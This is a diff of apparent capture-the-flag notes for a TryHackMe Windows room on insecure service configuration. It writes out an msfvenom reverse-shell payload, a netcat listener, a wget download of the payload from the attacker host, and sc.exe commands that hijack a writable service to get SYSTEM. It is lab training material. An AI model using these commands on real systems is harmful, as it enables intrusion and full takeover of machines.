@@ -118,3 +118,27 @@ Get flag from user desktop:
 type C:\Users\svcusr2\Desktop\flag.txt 
 
 THM{QUOTES_EVERYWHERE}
+
+# Insecure Sys Config
+The payloads are all the same, it's just good practice to type out that msfvenom string a lot so here's the next one:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.14.120 LPORT=4447 -f exe-service -o rev-svc3.exe   
+start netcat:
+nc -lvnp 4447
+
+wget from remote and put in thm-unpriv folder:
+wget http://10.11.14.120:8000/rev-svc3.exe -O C:\Users\thm-unpriv\rev-svc3.exe
+
+icacls C:\Users\thm-unpriv\rev-scv3.exe /grant Everyone:F
+
+then configure the vulnerable (editable) THMService to start it.
+sc.exe config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+(sc.exe as I'm in powershell)
+
+ sc.exe stop THMService (it hasn't been started)
+  sc.exe start THMService
+  and viola...nt authoritaaa!!!
+
+nt authority\system:
+
+get flag!
+THM{INSECURE_SVC_CONFIG}
